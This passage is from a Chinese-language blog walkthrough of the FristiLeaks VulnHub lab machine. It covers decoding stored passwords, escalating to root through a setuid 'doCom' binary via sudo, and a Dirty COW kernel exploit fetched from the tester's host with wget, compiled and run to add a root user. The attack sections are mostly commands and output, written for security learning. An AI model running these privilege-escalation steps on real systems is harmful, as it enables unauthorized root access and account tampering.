2&gt;/dev/null</span><br><span class="line">/home/admin</span><br><span class="line">/home/admin/df</span><br><span class="line">/home/admin/cat</span><br><span class="line">/home/admin/chmod</span><br><span class="line">/home/admin/cryptedpass.txt</span><br><span class="line">/home/admin/.bash_logout</span><br><span class="line">/home/admin/.bashrc</span><br><span class="line">/home/admin/echo</span><br><span class="line">/home/admin/egrep</span><br><span class="line">/home/admin/ps</span><br><span class="line">/home/admin/cryptpass.py</span><br><span class="line">/home/admin/.bash_profile</span><br><span class="line">/home/admin/grep</span><br><span class="line">/home/admin/cronjob.py</span><br><span class="line">/var/spool/mail/admin</span><br><span class="line">/tmp/cronresult</span><br><span class="line"></span><br><span class="line">cryptedpass.txt</span><br><span class="line">mVGZ3O3omkJLmy2pcuTq</span><br><span class="line"></span><br><span class="line">whoisyourgodnow.txt</span><br><span class="line">=RFn0AKnlMHMPIzpyuTI0ITG</span><br><span class="line"></span><br><span class="line">cryptpass.py</span><br><span class="line">import base64,codecs,sys</span><br><span class="line"></span><br><span class="line">def encodeString(str):</span><br><span class="line">    base64string= base64.b64encode(str)</span><br><span class="line">    return codecs.encode(base64string[::-1], &#x27;rot13&#x27;)</span><br><span class="line"></span><br><span class="line">cryptoResult=encodeString(sys.argv[1])</span><br><span class="line">print cryptoResult</span><br></pre></td></tr></table></figure>
+<p>先base64编码，后反转字符串，再rot13编码。</p>
+<p>改写为解密脚本decryptpass.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64,codecs,sys</span><br><span class="line"></span><br><span class="line">def decodeString(str):</span><br><span class="line">    rot13string=codecs.encode(str[::-1], &#x27;rot13&#x27;)</span><br><span class="line">    explicit= base64.b64decode(rot13string)</span><br><span class="line">    return explicit</span><br><span class="line"></span><br><span class="line">cryptedpass=&#x27;mVGZ3O3omkJLmy2pcuTq&#x27;</span><br><span class="line">whoisyourgodnow=&#x27;=RFn0AKnlMHMPIzpyuTI0ITG&#x27;</span><br><span class="line"></span><br><span class="line">print (&quot;cryptedpass: &quot;,str(decodeString(cryptedpass),encoding=&#x27;utf-8&#x27;))</span><br><span class="line">print (&quot;whoisyourgodnow: &quot;,str(decodeString(whoisyourgodnow),encoding=&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$ python decryptpass.py</span><br><span class="line">cryptedpass:  thisisalsopw123</span><br><span class="line">whoisyourgodnow:  LetThereBeFristi!</span><br><span class="line"></span><br><span class="line">su fristigod</span><br><span class="line">Password: LetThereBeFristi!</span><br><span class="line"></span><br><span class="line">根据passwd文件中：fristigod:x:502:502::/var/fristigod:/bin/bash</span><br><span class="line">cd /var/fristigod</span><br><span class="line">ls -al</span><br><span class="line">-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history</span><br><span class="line">drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff</span><br><span class="line"></span><br><span class="line">cat .bash_history</span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">ls -lah</span><br><span class="line">cd .secret_admin_stuff/</span><br><span class="line">ls</span><br><span class="line">./doCom </span><br><span class="line">./doCom test</span><br><span class="line">sudo ls</span><br><span class="line">exit</span><br><span class="line">cd .secret_admin_stuff/</span><br><span class="line">ls</span><br><span class="line">./doCom </span><br><span class="line">sudo -u fristi ./doCom ls /</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">groups</span><br><span class="line">ls -lah</span><br><span class="line">usermod -G fristigod fristi</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">less /var/log/secure e</span><br><span class="line">Fexit</span><br><span class="line">exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>看出可以通过sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom执行root命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd .secret_admin_stuff</span><br><span class="line">ls -al</span><br><span class="line">**-rwsr-sr-x**  1 root      root      7529 Nov 25  2015 doCom</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</span><br><span class="line">[sudo] password for fristigod: LetThereBeFristi!</span><br><span class="line">\# id</span><br><span class="line">uid=0(root) gid=100(users) groups=100(users),502(fristigod)</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>测试机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/share/exploitdb/exploits/linux/local/40839.c .</span><br><span class="line">$ python -m http.server 8080</span><br></pre></td></tr></table></figure>
+<p>靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget 192.168.31.196:8080/40839.c</span><br><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">./dirty 123456qaz</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">firefart:fire86WDPZnrM:0:0:pwned:/root:/bin/bash</span><br><span class="line">mmap: 7ff3e25bd000</span><br><span class="line">madvise 0</span><br><span class="line">ptrace 0</span><br><span class="line">Done! Check /etc/passwd to see if the new user was created.</span><br><span class="line">You can log in with the username &#x27;firefart&#x27; and the password &#x27;123456qaz&#x27;.</span><br><span class="line">DON&#x27;T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd</span><br><span class="line"></span><br><span class="line">$ su firefart</span><br><span class="line">Password: 123456qaz</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line">uid=0(firefart) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /var/spool/cron</span><br><span class="line">* * * * * /usr/bin/python /home/admin/cronjob.py</span><br><span class="line"></span><br><span class="line">cat /etc/sudoers</span><br><span class="line">fristigod ALL=(fristi:ALL) /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line"></span><br><span class="line"># cat /root/fristileaks_secrets.txt</span><br><span class="line">cat /root/fristileaks_secrets.txt</span><br><span class="line">Flag: Y0u_kn0w_y0u_l0ve_fr1st1</span><br></pre></td></tr></table></figure>
+<p>没猜到fristi目录，当时没法翻译这个单词，后来查了下是个饮料的名字</p>
+<p>本文未经作者同意禁止转载！</p>
+<p>文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/VulnHub/" rel="tag"># VulnHub</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/02/27/DVR%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87(CVE-2018-9995)/" rel="prev" title="DVR登录绕过(CVE-2018-9995)">
+                  <i class="fa fa-chevron-left"></i> DVR登录绕过(CVE-2018-9995)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/11/%E3%80%90%E6%94%BB%E7%95%A5%E9%B8%AD%E3%80%91InfoSec%20PrepOSCP_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="next" title="【攻略鸭】InfoSec PrepOSCP_VulnHub靶机攻略">
+                  【攻略鸭】InfoSec PrepOSCP_VulnHub靶机攻略 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rerestst</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
